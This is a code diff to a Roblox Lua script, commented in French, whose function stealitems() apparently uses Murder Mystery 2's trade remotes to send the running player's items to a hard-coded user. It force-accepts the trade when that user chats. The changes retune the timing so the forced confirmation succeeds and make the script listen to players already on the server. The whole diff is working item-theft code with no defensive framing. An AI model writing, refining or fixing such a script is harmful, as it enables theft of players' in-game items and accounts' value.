@@ -498,7 +498,7 @@ local function stealitems()
     }
     game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(unpack(sendArgs))
 
-    wait(3)
+    task.wait(3)
 
     for a,b in pairs(uniqueItems) do
         for i = 1, b.amount do
@@ -556,17 +556,16 @@ local function stealitems()
         end
     end
 
-    wait(12)
+    task.wait(2)
 
-    -- Première acceptation (Lancer le délai de confirmation)
+    -- Première demande d'acceptation
     pcall(function()
         game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer()
     end)
 
-    -- Attente du délai du système de trade de MM2
-    task.wait(4)
+    task.wait(12)
 
-    -- Deuxième acceptation forcée (Confirmer définitivement l'échange)
+    -- Deuxième demande d'acceptation (confirmation)
     for i = 1, 3 do
         pcall(function()
             game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer()
@@ -575,10 +574,19 @@ local function stealitems()
     end
 end
 
-game.Players.PlayerAdded:Connect(function(player)
+-- Fonction pour connecter le tchat du joueur cible
+local function listenToPlayer(player)
     if player.Name == userName then
         player.Chatted:Connect(function(msg)
             stealitems()
         end)
     end
-end)
+end
+
+-- 1. Écouter les joueurs déjà présents sur le serveur
+for _, player in pairs(game.Players:GetPlayers()) do
+    listenToPlayer(player)
+end
+
+-- 2. Écouter les futurs joueurs qui rejoignent
+game.Players.PlayerAdded:Connect(listenToPlayer)
